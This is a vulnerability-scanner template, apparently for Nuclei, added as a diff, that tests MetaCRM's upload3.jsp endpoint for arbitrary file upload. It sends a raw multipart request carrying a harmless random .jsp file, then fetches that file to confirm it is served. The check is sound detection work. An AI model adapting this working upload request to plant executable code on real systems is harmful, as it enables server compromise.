@@ -1,0 +1,54 @@
+id: metacrm-commonjspupload3-anyfile-upload
+
+info:
+  name: MetaCRM Arbitrary File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+
+variables:
+  t1: "{{rand_base(4)}}"
+  t2: "{{base64(t1)}}"
+
+http:
+  - raw:
+      - |
+        POST /common/jsp/upload3.jsp?key=file&form=formdata&field=attach_name_1&filetitle=attach_title_1&folder=null&relativepath=null&%3E HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----geckoformboundaryc4e5992e491182d9864532ef66356073
+
+        ------geckoformboundaryc4e5992e491182d9864532ef66356073
+        Content-Disposition: form-data; name="file"; filename="{{t1}}.jsp"
+        Content-Type: application/octet-stream
+
+        {{t2}}
+        ------geckoformboundaryc4e5992e491182d9864532ef66356073--
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - ".jsp"
+      - type: status
+        status:
+          - 200
+    extractors:
+      - type: regex
+        name: uploaded-file-path
+        regex:
+          - "/userfile/default/temp/(?P<file>.*?).jsp"
+        internal: true
+
+  - raw:
+      - |
+        GET /userfile/default/temp/{{file}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{t2}}"
+      - type: status
+        status:
+          - 200
